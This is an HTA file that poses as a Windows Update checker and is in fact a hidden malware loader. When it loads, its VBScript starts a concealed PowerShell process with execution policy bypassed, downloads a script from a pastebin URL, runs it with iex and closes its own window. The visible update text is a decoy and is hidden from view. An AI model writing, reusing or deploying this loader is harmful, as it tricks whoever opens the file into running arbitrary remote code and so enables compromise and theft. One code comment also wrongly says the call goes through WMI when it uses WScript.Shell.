<html>
<head>
<HTA:APPLICATION 
    ID="LegitUpdater"
    APPLICATIONNAME="Windows Update"
    BORDER="none"
    BORDERSTYLE="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
    Function RunStealth()
        Dim cmd, ws
        Set ws = CreateObject("WScript.Shell")
        
        ' Indirect PowerShell invocation through WMI
        cmd = "powershell -nop -w 1 -exec bypass -c ""$url='https://pastebin.com/raw/...';" & _
              "$wc=New-Object Net.WebClient;" & _
              "$wc.Headers.Add('User-Agent','Mozilla/5.0');" & _
              "iex $wc.DownloadString($url)"""
        
        ws.Run "cmd /c " & cmd, 0, False
        window.close()
    End Function
    
    Sub Window_OnLoad
        On Error Resume Next
        RunStealth()
        On Error GoTo 0
    End Sub
</script>
</head>
<body>
<!-- Legitimate-looking content -->
<div style="display:none">
    <p>Checking for system updates...</p>
</div>
</body>
</html>
